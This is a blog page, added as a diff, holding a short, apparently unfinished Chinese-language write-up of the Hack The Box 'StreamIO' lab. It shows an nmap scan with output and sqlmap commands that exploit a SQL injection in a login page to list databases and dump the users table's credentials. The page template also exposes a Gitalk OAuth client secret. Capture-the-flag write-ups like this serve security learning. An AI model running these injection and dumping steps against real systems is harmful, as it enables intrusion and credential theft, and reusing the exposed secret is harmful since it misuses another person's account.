@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>StreamIO - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - StreamIO靶场信息  靶场类型  信息收集Nmap┌──(root㉿lucifiel)-[~&#x2F;Desktop] └─# nmap -sS -sC -sV -A -p- -min-rate 5000 10.10.11.158 Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-06-17 13:41 CST Nmap sca">
+<meta property="og:type" content="article">
+<meta property="og:title" content="StreamIO - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - StreamIO靶场信息  靶场类型  信息收集Nmap┌──(root㉿lucifiel)-[~&#x2F;Desktop] └─# nmap -sS -sC -sV -A -p- -min-rate 5000 10.10.11.158 Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-06-17 13:41 CST Nmap sca">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/a359c61f-cba2-4888-9bce-7163a14523f4.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/571e549b-aee6-4799-bde8-f3a5c9a87e92.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/7f6d5482-1245-4af2-87b3-7eb6c08280fc.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/7cb81489-c2af-4a56-a789-49f9918c9d0e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/e1550ea9-be81-4a6f-8e71-e9f7c72aa7bf.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/bc66f23a-adde-47e5-a8b8-a5a14631456e.png">
+<meta property="article:published_time" content="2022-06-04T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-17T02:32:37.836Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/a359c61f-cba2-4888-9bce-7163a14523f4.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">StreamIO - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">StreamIO - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-06-04T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-06-04
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-StreamIO"><span class="post-toc-text">Hackthebox - StreamIO</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Https"><span class="post-toc-text">Https</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#SQL-注入"><span class="post-toc-text">SQL 注入</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Medium/Hackthebox-StreamIO"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">StreamIO - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-06-04 19:38:36" datetime="2022-06-04T11:38:36.000Z"  itemprop="datePublished">2022-06-04</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-StreamIO"><a href="#Hackthebox-StreamIO" class="headerlink" title="Hackthebox - StreamIO"></a>Hackthebox - StreamIO</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/a359c61f-cba2-4888-9bce-7163a14523f4.png" class title="image">
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><img src="/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/571e549b-aee6-4799-bde8-f3a5c9a87e92.png" class title="image">
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# nmap -sS -sC -sV -A -p- -min-rate 5000 10.10.11.158
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-17 13:41 CST
+Nmap scan report for 10.10.11.158
+Host is up (0.69s latency).
+Not shown: 65515 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows Server
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-17 12:42:04Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
+443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| tls-alpn: 
+|_  http/1.1
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+|_ssl-date: 2022-06-17T12:44:06+00:00; +7h00m00s from scanner time.
+| ssl-cert: Subject: commonName=streamIO/countryName=EU
+| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
+| Not valid before: 2022-02-22T07:03:28
+|_Not valid after:  2022-03-24T07:03:28
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49701/tcp open  msrpc         Microsoft Windows RPC
+49964/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+Network Distance: 2 hops
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
+| smb2-time: 
+|   date: 2022-06-17T12:43:25
+|_  start_date: N/A
+
+TRACEROUTE (using port 135/tcp)
+HOP RTT       ADDRESS
+1   831.08 ms 10.10.16.1
+2   831.12 ms 10.10.11.158
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 184.57 seconds
+</code></pre>
+<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><img src="/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/7f6d5482-1245-4af2-87b3-7eb6c08280fc.png" class title="image">
+
+<p>80 端口就是一个 iis 默认页面，没什么东西</p>
+<h2 id="Https"><a href="#Https" class="headerlink" title="Https"></a>Https</h2><img src="/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/7cb81489-c2af-4a56-a789-49f9918c9d0e.png" class title="image">
+
+<p>https 页面会报错，我往回看了一下，有两个 DNS </p>
+<pre><code class="bash">DNS:streamIO.htb, DNS:watch.streamIO.htb
+</code></pre>
+<p>我们给添加到 hosts 中</p>
+<pre><code class="bash">echo 10.10.11.158 streamIO.htb watch.streamIO.htb &gt;&gt; /etc/hosts
+</code></pre>
+<p>然后去访问一下 <a href="https://streamio.htb/" target="_blank" rel="noopener">https://streamIO.htb/</a></p>
+<img src="/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/e1550ea9-be81-4a6f-8e71-e9f7c72aa7bf.png" class title="image">
+
+<p>这边有一个登录页面</p>
+<img src="/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/bc66f23a-adde-47e5-a8b8-a5a14631456e.png" class title="image">
+
+<p>猜测可能是有注入，去尝试一下</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><pre><code class="bash">┌──(root💀lucifiel)-[~/Desktop]
+└─# sqlmap -u &quot;https://streamIO.htb/login.php&quot; --method POST --data &quot;username=FUZZ&amp;password=FUZZ&quot; --dbs
+
+available databases [5]:
+[*] model
+[*] msdb
+[*] STREAMIO
+[*] streamio_backup
+[*] tempdb
+</code></pre>
+<p>确实有个时间注入，不过是真的慢，我就直接放结果了</p>
+<pre><code class="bash">┌──(root💀lucifiel)-[~/Desktop]
+└─# sqlmap -u &quot;https://streamIO.htb/login.php&quot; --method POST --data &quot;username=FUZZ&amp;password=FUZZ&quot; --batch -D STREAMIO -T users -C username,password --dump
+</code></pre>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/&title=《StreamIO - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/&title=《StreamIO - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《StreamIO - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/06/07/Hackthebox/Easy/Hackthebox-OpenSource/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">OpenSource - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Noter - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/&title=《StreamIO - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/&title=《StreamIO - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《StreamIO - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACvklEQVR42u3a0U7DMAwFUP7/p0HiBSS27tqOtyGdPE2la3MyKQ62Pz7i8fk9fn/+Pa7vvH7a32feu37vaQcGHh4eXmvq98a91yf3X2PyxcrffmMJ8PDw8NZ4STBIpptv9Mkcrhc3CTl4eHh4r+VdX+kBro/LSeDBw8PD+y+85HDcCyHJgRsPDw/vHXh5ciE/8iajR1rJteDh4eHFvF4B7LWf1+t7eHh4eK2qel4SqxbGqgmI5jzx8PDwFniTQn5evtoAFApjeHh4eAu8JMGa/DVPs+bhodeggIeHh7fHqwaAXvCoJoWPNV3h4eHhrfHmbVX5Ft8rtvXSFnh4eHjP4eVFr94RfBJ4yj8GHh4e3gIvf+g8pTtfoLyhAQ8PD2+Plx9tJymGXiqhehB/kGvBw8PDO8TrPTpPTEyO7NU7o7iHh4eHd5TX+0I1GOTb/fXbm9/Fw8PDO8SrpmurRal5ga1aGCtHPDw8PLyYNznU5imMPPBUUyEPDv14eHh4a7yNRECecs1DRXLlRtMVHh4e3lFeXrBPUgPVF+eJjOo9eHh4eNu83nTnAaA69V74wcPDw3s+bz6J6lLmjAN5azw8PLwWr5cknYeBagktbyPAw8PDew6vFwaq9ySTmxypD0c5PDw8vCAk9LbmSZjpYaLCGB4eHt4CLy/PV1Oo80Rt1FYVzBMPDw/vLG+0Hq3GgryloBo8bnzGw8PDW+D1Jpo3aSWjt6BJIQ0PDw9vg/dZHJPWgSqm1/b6oA8XDw8Pb8zrbbvV//QnTQA5o5d0xsPDw+vx8iNvHjby0lf+C+TtX4Xoh4eHhzfg5ZOrlqwmR+dJywIeHh7e+/AmIaSamEjCwIPjOx4eHt5LedW0bHkqxZRElMbFw8PDW+NVt/tesaoXeHptDXh4eHh7vHkBrLfRJ+EkSemu1/fw8PDwfq58AdbkIhbSZ2eLAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
